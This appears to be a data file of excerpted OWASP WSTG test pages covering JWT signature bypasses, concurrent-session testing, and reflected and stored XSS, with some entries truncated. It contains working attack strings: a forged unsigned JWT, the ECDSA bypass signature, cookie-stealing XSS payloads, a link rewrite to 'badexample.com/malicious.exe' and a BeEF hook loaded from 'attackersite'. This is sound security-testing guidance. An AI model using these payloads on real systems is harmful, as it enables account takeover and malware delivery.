    The header and payload are then re-encoded with base64, and the signature is removed (leaving the trailing period). Using the header above, and the payload listed in the [payload](#payload) section, this would give the following JWT:

    ```txt
    eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.
    ```

    Some implementations try and avoid this by explicitly blocking the use of the `none` algorithm. If this is done in a case-insensitive way, it may be possible to bypass by specifying an algorithm such as `NoNe`.

    #### ECDSA "Psychic Signatures"

    A vulnerability was identified in Java version 15 to 18 where they did not correctly validate ECDSA signatures in some circumstances ([CVE-2022-21449](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/), known as "psychic signatures"). If one of these vulnerable versions is used to parse a JWT using the `ES256` algorithm, this can be used to completely bypass the signature verification by tampering the body and then replacing the signature with the following value:

    ```txt
    MAYCAQACAQA
    ```

    Resulting in a JWT which looks something like this:

    ```txt
    eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA
    ```

    ### Weak HMAC Keys

    If the JWT is signed using a HMAC-based algorithm (such as HS256), the security of the signature is entirely reliant on the strength of the secret key used in the HMAC.

    If the application is using off-the-shelf or open source software, the first step should be go investigate the code, and see whether there is default HMAC signing key that is used.

    If there isn't a default, then it may be possible to crack guess or brute-force they key. The simplest way to do this is to use the [crackjwt.py](https://github.com/Sjord/jwtcrack) script, which simply requires the JWT and a dictionary file.

    A more powerful option is to convert the JWT into a format that ca

    _(truncated — see the full WSTG test)_
- title: WSTG-SESS-11 Testing for Concurrent Sessions
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-11 — Testing for Concurrent Sessions

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-11) — CC BY-SA 4.0

    Concurrent sessions are a common aspect of web applications that enable multiple simultaneous user interactions. This test case aims to evaluate the application's ability to handle multiple active sessions for a single user. This functionality is essential for effectively managing concurrent user sessions, particularly in sensitive areas such as admin panels containing Personally Identifiable Information (PII), personal user accounts, or APIs reliant on third-party services to enrich user-provided data. The primary objective is to ensure that concurrent sessions align with the application's security requirements.

    ### Test Objectives

    - Evaluate the application's session management by assessing the handling of multiple active sessions for a single user account.

    ### How to Test

    1. **Generate Valid Session:**
       - Submit valid credentials (username and password) to create a session.
       - Example HTTP Request:

         ```http
         POST /login HTTP/1.1
         Host: www.example.com
         Content-Length: 32

         username=admin&password=admin123
         ```

       - Example Response:

         ```http
         HTTP/1.1 200 OK
         Set-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure
         ```

       - Store the generated authentication cookie. In some cases, the generated authentication cookie is replaced by tokens such as JSON Web Tokens (JWT).

    2. **Test for Generating Active Sessions:**
       - Attempt to create multiple authentication cookies by submitting login requests (e.g., one hundred times).

       Note: Utilizing private browsing mode or multi-account containers might be beneficial for conducting these tests, as they can provide separate environments for testing session management without interference from existing sessions or cookies stored in the browser.

    3. **Test for Validating Active Sessions:**
       - Try accessing the application using the initial session token (e.g., `SESSIONID=0add0d8eyYq3HIUy09hhus`).
       - If successful authentication occurs with the first generated token, consider it a potential issue indicating inadequate session management.

    Also, there are additional test cases that extend the scope of the testing methodology to include scenarios involving multiple sessions originating from various IPs and locations. These test cases aid in identifying potential vulnerabilities or irregularities in session handling related to geographical or network-based factors:

    - Test Multiple sessions from the same IP.
    - Test Multiple sessions from different IPs.
    - Test Multiple sessions from locations that are unlikely or impossible to be visited by the same user in a short period of time (e.g., one session created in a specific country, followed by another session generated five minutes later from a different country).
- title: WSTG-INPV-01 Testing for Reflected Cross Site Scripting
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-01 — Testing for Reflected Cross Site Scripting

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-01) — CC BY-SA 4.0

    Reflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occurs when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.

    ### Test Objectives

    - Identify variables that are reflected in responses.
    - Assess the input they accept and the encoding that gets applied on return (if any).

    ### How to Test

    ### Black-Box Testing

    A black-box test will include at least three phases:

    #### Detect Input Vectors

    Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.

    #### Analyze Input Vectors

    Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
      Some example of such input data are the following:

    - `<script>alert(123)</script>`
    - `"><script>alert(document.cookie)</script>`

    For a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

    #### Check Impact

    For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.

    Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:

    - `>` (greater than)
    - `<` (less than)
    - `&` (ampersand)
    - `'` (apostrophe or single quote)
    - `"` (double quote)

    However, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

    Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:

    - `\n` (new line)
    - `\r` (carriage return)
    - `'` (apostrophe or single quote)
    - `"` (double quote)
    - `\` (backslash)
    - `\uXXXX` (unicode values)

    For a more complete reference, see the [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).

    #### Example 1

    For example, consider a site that has a welcome notice `Welcome %username%` and a download link.

    ![XSS Example 1](images/XSS_Example1.png)\
    *Figure 4.7.1-1: XSS Example 1*

    The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.

    Let's try to click on the following link and see what happens:

    ```text
    https://example.com/index.php?user=<script>alert(123)</script>
    ```

    If no sanitization is applied this will result in the following popup:

    ![Alert](images/Alert.png)\
    *Figure 4.7.1-2: XSS Example 1*

    This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if the target clicks on the tester's link.

    #### Example 2

    Let's try other piece of code (link):

    ```text
    https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "https://badexample.com/malicious.exe";}</script>
    ```

    This produces the following behavior:

    ![XSS Example 2](images/XSS_Example2.png)\
    *Figure 4.7.1-3: XSS Example 2*

    This will cause the user, clicking on the link supplied by the tester, to download the file `malicious.exe` from a site they control.

    ### Bypass XSS Filters

    Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.

    Thus, the majority of XSS prevention must depend on the web application's sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.

    The [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.

    #### Example 3: Tag Attribute Value

    Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as `<` and `>` that are commonly filtered.

    For example, the web application could use the user input value to fill an attribute, as shown in the following code:

    ```html
    <input type="text" name="state" value="INPUT_FROM_USER">
    ```

    Then an attacker could submit the following code:

    ```text
    " onfocus="alert(document.cookie

    _(truncated — see the full WSTG test)_
- title: WSTG-INPV-02 Testing for Stored Cross Site Scripting
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-02 — Testing for Stored Cross Site Scripting

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-02) — CC BY-SA 4.0

    Stored [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.

    ### Test Objectives

    - Identify stored input that is reflected on the client-side.
    - Assess the input they accept and the encoding that gets applied on return (if any).

    ### How to Test

    ### Black-Box Testing

    The process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md).

    #### Input Forms

    The first step is to identify all points where user input is stored into the backend and then displayed by the application. Typical examples of stored user input can be found in:

    - User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
    - Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
    - File Manager: application that allows upload of files
    - Application settings/preferences: application that allows the user to set preferences
    - Forum/Message board: application that permits exchange of posts among users
    - Blog: if the blog application permits to users submitting comments
    - Log: if the application stores some users input into logs.

    > Note: This can also include URL paths, cookies, HTTP headers and other less-obvious types of user input, as well as GET and POST parameters.

    #### Analyze HTML Code

    Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pentester should also investigate any out-of-band channels through which the application receives and stores users input, such as via email or integration with external applications.

    > Note: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.

    **Example**: Email stored data in `index2.php`

    ![Stored Input Example](images/Stored_input_example.jpg)\
    *Figure 4.7.2-1: Stored Input Example*

    The HTML code of index2.php where the email value is located:

    ```html
    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
    ```

    In this case, the tester needs to find a way to inject code outside the `<input>` tag as below:

    ```html
    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
    ```

    #### Testing for Stored XSS

    This involves testing the input validation and filtering controls of the application. Basic injection examples in this case:

    - `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
    - `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

    Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.

    > ![Stored XSS Example](images/Stored_xss_example.jpg)\
    > *Figure 4.7.2-2: Stored Input Example*
    >
    > The HTML code following the injection:
    >
    > ```html
    > <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
    > ```
    >
    > The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string "SCRIPT" is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and other XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.

    #### Leverage Stored XSS with BeEF

    Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://beefproject.com).

    A typical BeEF exploitation scenario involves:

    - Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)
    - Waiting for the application user to view the vulnerable page where the stored input is displayed
    - Control the application user’s browser via the BeEF console

    The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.

    **Example**: BeEF Injection in `index2.php`:

    ```html
    aaa@aa.com"><script src=https://attackersite/hook.js></script>
    ```

    When the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.

    > ![Beef Injection Example](images/RubyBeef.png)\
    > *Figure 4.7.2-3: Beef Injection Example*
    >
    > This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.

    #### File Upload

    If the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the uploaded file. The pentester should also verify if the file upload allows setting arbitrary MIME types.

    Consider the following HTTP POST request for file upload:

    ```http
    POST /fileupload.aspx HTTP/1.1
    […]
    Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
    Content-Type: text/plain

    test
    ```

    This design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as `image/gif` can instead be

    _(truncated — see the full WSTG test)_
